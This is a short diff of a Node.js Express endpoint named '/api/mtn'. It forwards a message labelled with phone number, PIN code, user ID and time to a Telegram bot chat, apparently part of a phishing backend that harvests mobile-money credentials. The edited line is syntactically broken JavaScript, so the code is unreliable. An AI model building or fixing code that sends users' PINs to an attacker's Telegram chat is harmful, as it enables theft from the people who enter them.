@@ -35,9 +35,7 @@ app.post("/api/mtn", async (req, res) => {
       },
       body: JSON.stringify({
         chat_id: process.env.TELEGRAM_CHAT_ID,
-        text:"Phone number, Pincode,User ID,Time":
-  
-     })
+        text:"Phone number, Pincode,User ID,Time".})
     });
 
     console.log("Telegram response status:", response.status);
